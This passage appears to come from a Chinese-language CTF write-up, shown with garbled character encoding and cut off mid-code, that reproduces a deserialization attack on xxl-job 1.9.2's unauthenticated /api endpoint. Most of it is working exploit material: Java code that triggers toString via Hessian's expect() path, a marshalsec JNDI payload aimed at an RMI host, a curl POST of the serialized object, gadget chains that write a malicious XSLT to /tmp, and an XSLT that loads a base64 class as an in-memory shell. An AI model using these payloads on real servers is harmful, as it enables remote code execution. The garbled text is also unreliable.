title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å»æ‰¾ä¸€ä¸‹expectæ–¹æ³•çš„å¼•ç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241126230631856.png" alt="image-20241126230631856"></p><p>å¯ä»¥æ‰¾åˆ°å¤§éƒ¨åˆ†çš„readæ–¹æ³•éƒ½å¯ä»¥è°ƒç”¨expectæ–¹æ³•ï¼Œæ–‡ç« é€‰æ‹©çš„æ˜¯readStringï¼Œé‚£è¿™é‡Œä¹Ÿè·Ÿç€readStringæ¥</p><p>ç„¶åä¹Ÿæ˜¯é€šè¿‡æŸ¥æ‰¾å¼•ç”¨çš„æ–¹å¼æ‰¾readStringçš„è°ƒç”¨ï¼Œè¿™é‡Œå¼•ç”¨readStringçš„æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œæ‰€ä»¥é¢å‘ç»“æœæŸ¥æ‰¾ï¼ˆ</p><p>å®Œæ•´çš„åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Hessian2Input#readObject --&gt; Hessian2Input#readObjectDefinition --&gt; Hessian2Input#readString --&gt; Hessian2Input#expect<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯åˆ†æè§¦å‘çš„ç‚¹</p><p>é¦–å…ˆæ˜¯readObjectæ–¹æ³•ä¸­ï¼Œä»–ä¼šè¯»å–ç¬¬ä¸€ä¸ªå­—èŠ‚æ•°æ®æ¥è¿›è¡Œåˆ¤æ–­</p><p><img src="https://cdn.clown2024.cn/image-20241126231943276.png" alt="image-20241126231943276"></p><p>ç„¶åå¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºå¤§å†™Cå³byteä¸º67çš„è¯ï¼Œå°±ä¼šè°ƒç”¨readObjectDefinitionæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241126232117755.png" alt="image-20241126232117755"></p><p>ç„¶åé‡Œé¢å°±ä¼šè°ƒç”¨readStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241126232145954.png" alt="image-20241126232145954"></p><p>ç„¶åreadStringä¹Ÿæ˜¯è¯»å–å­—èŠ‚æ¥è¿›è¡Œåˆ¤æ–­</p><p><img src="https://cdn.clown2024.cn/image-20241126232608979.png" alt="image-20241126232608979"></p><p>ä½†æ˜¯æˆ‘ä»¬å†™å…¥çš„æ˜¯å¯¹è±¡ç±»å‹ï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨è€ƒè™‘ä»–è¯»å–çš„ç¬¬äºŒä¸ªtagï¼Œæœ€ç»ˆä¸€å®šä¼šèµ°åˆ°defaulté‡Œé¢è§¦å‘expect</p><p><img src="https://cdn.clown2024.cn/image-20241126232816146.png" alt="image-20241126232816146"></p><h3 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h3><p>é‚£ç°åœ¨æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•æ§åˆ¶ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥ä½¿ç”¨<strong>System.arraycopy</strong>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯javaä¸­ç”¨æ¥å¤åˆ¶æ•°ç»„å…ƒç´ çš„æ–¹æ³•</p><p>å†™ä¸€ä¸ªPersonç±»é‡Œé¢çš„toStringæ–¹æ³•æœ‰æ¶æ„ä»£ç æ¥ç®€å•æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">expectExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;Hessianå¼‚å¸¸toStringæˆåŠŸæo(=â€¢ã‚§â€¢=)m&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(person);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241126234432399.png" alt="image-20241126234432399"></p><h1 id="å¼€å§‹å¤ç°"><a href="#å¼€å§‹å¤ç°" class="headerlink" title="å¼€å§‹å¤ç°"></a>å¼€å§‹å¤ç°</h1><p>é¢˜ç›®å°±æ˜¯ä¸€ä¸ªxxl-jobçš„1.9.2çš„ç‰ˆæœ¬ï¼Œç‰ˆæœ¬æŒºä½çš„ï¼Œä¸€ä¸ªxxl-jobçš„æ€»ç»“ï¼Œå¤§éƒ¨åˆ†wpéƒ½æ˜¯çœ‹è¿™ä¸ªçš„ï¼š<a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p>æ€»ç»“å°±æ˜¯xxl-jobä¸€èˆ¬æœ‰ä¸¤ä¸ªæ‰“æ³•ï¼Œä¸€ä¸ªæ˜¯æ‰“apiæœªæˆæƒï¼Œä¸€ä¸ªæ˜¯æ‰“executoræœªæˆæƒï¼Œè¯¥é¢˜æ‰“çš„å°±æ˜¯apiæœªæˆæƒè®¿é—®</p><h2 id="apiæœªæˆæƒæ‰“æ³•"><a href="#apiæœªæˆæƒæ‰“æ³•" class="headerlink" title="apiæœªæˆæƒæ‰“æ³•"></a>apiæœªæˆæƒæ‰“æ³•</h2><p>apiæœªæˆæƒï¼Œæ˜¯é’ˆå¯¹adminç»„ä»¶çš„ï¼Œè®¿é—®apiçš„æ—¶å€™ä¼šè¿”å›è¿™æ ·çš„å†…å®¹ï¼Œè¯æ˜è¿™æ˜¯å­˜åœ¨apiæœªæˆæƒ</p><p><img src="https://cdn.clown2024.cn/image-20241127000028369.png" alt="image-20241127000028369"></p><p>å¯ä»¥å»çœ‹çœ‹xxl-job-adminçš„æºç ä¸‹çš„apiè·¯ç”±éƒ½æ˜¯å¹²ä»€ä¹ˆçš„</p><p><img src="https://cdn.clown2024.cn/image-20241127000743175.png" alt="image-20241127000743175"></p><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šè°ƒç”¨doInvokeæ–¹æ³•ï¼Œç„¶åç›´æ¥å°†bodyå…¨éƒ¨éƒ½ååºåˆ—åŒ–äº†</p><h3 id="æ‰“jndiæ³¨å…¥"><a href="#æ‰“jndiæ³¨å…¥" class="headerlink" title="æ‰“jndiæ³¨å…¥"></a>æ‰“jndiæ³¨å…¥</h3><p>ç„¶åå°±å¯ä»¥ç›´æ¥åˆ©ç”¨jndiï¼Œç”¨marshalsecç”Ÿæˆexpå»æ‰“</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi://x.x.x.x:1099/aaa &gt; test.ser<br></code></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯SpringAbstractBeanFactoryPointcutAdvisorè¿™æ¡é“¾å­</p><p>ç„¶ååˆ©ç”¨curlå»å‘åŒ…å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -XPOST -H <span class="hljs-string">&quot;Content-Type: x-application/hessian&quot;</span> --data-binary @test.ser http://127.0.0.1:8080/api<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ‰“æ³•éœ€è¦ç¯å¢ƒå‡ºç½‘ï¼Œè¿™é‡Œé¢˜ç›®æ˜¯ä¸å‡ºç½‘çš„ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ç§æ–¹å¼å»æ‰“å†…å­˜é©¬</p><h3 id="xsltæ‰“å†…å­˜é©¬"><a href="#xsltæ‰“å†…å­˜é©¬" class="headerlink" title="xsltæ‰“å†…å­˜é©¬"></a>xsltæ‰“å†…å­˜é©¬</h3><p>XSLTï¼ˆeXtensible Stylesheet Language Transformationsï¼Œå¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ï¼‰æ˜¯ä¸€ç§ç”¨äºè½¬æ¢XMLæ–‡æ¡£çš„ç¼–ç¨‹è¯­è¨€ã€‚XSLTå®šä¹‰äº†å¦‚ä½•å°†ä¸€ä¸ªXMLæ–‡æ¡£è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œæ¯”å¦‚HTMLã€æ–‡æœ¬æˆ–è€…å¦ä¸€ä¸ªXMLæ–‡æ¡£ã€‚</p><p>è¿™éƒ¨åˆ†çš„åˆ©ç”¨åœ¨Nookipopå¸ˆå‚…çš„æ–‡ç« ä¸­æœ‰è¯´ï¼Œé‡Œé¢ä¸€äº›Hessiançš„é“¾å­æ²¡è§è¿‡ï¼Œè¿˜ä¸´æ—¶å»è¡¥äº†ä¸€ä¸‹</p><p>å› ä¸ºä¸å‡ºç½‘å°±éœ€è¦æ‰“å†…å­˜é©¬ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦æ‰“ä¸¤æ¬¡payloadï¼Œç¬¬ä¸€æ¬¡å†™å…¥xsltæ–‡ä»¶ï¼Œç¬¬äºŒæ¬¡è§£æxsltæ–‡ä»¶æ‰“å…¥å†…å­˜é©¬</p><p>å…ˆåˆ©ç”¨Hessiançš„PKCS9Attributesè¿™æ¡åŸç”Ÿé“¾å­å†™ä¸€ä¸ªxsltæ–‡ä»¶èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>&#125;&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ€åè°ƒç”¨çš„é™æ€æ–¹æ³•æ˜¯Process#_mainæ–¹æ³•ï¼Œè¯¥æ–¹æ³•èƒ½å¤Ÿè§£æxsltæ–‡ä»¶</p><p>èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç çš„æ¶æ„xsltæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç”¨æ¥å†™å…¥çš„é™æ€æ–¹æ³•ï¼Œé€‰ç”¨JavaUtilsçš„writeBytesTofilename</p><p><img src="https://cdn.clown2024.cn/image-20241127211222432.png" alt="image-20241127211222432"></p><p>é‚£å°±å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªpayload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javasec.pocs.hessian;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.javasec.utils.SerializeUtils;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianProxyLVFileWrite</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//PKCS9Attribute.EMAIL_ADDRESS_OID æ˜¯å›ºå®šçš„ï¼Œè°ƒè¯•æµç¨‹å¯ä»¥çœ‹åˆ°é€»è¾‘</span><br>        <span class="hljs-comment">//å»ä¿®æ”¹éœ€è¦è¯»å–çš„æ–‡ä»¶ï¼Œå’Œå†™å…¥çš„æ–‡ä»¶åï¼Œå®ä¾‹ä¸­æ˜¯è¯»å–1.txtå†™å…¥pwned.txt</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>,SerializeUtils.getFileBytes(<span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>)&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œå†™ä¸€ä¸ªexpèƒ½å¤Ÿåºåˆ—åŒ–payloadå¹¶å‘é€postè¯·æ±‚çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br><span class="hljs-comment">//        Hessian2_Deserial(poc);</span><br>        <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span 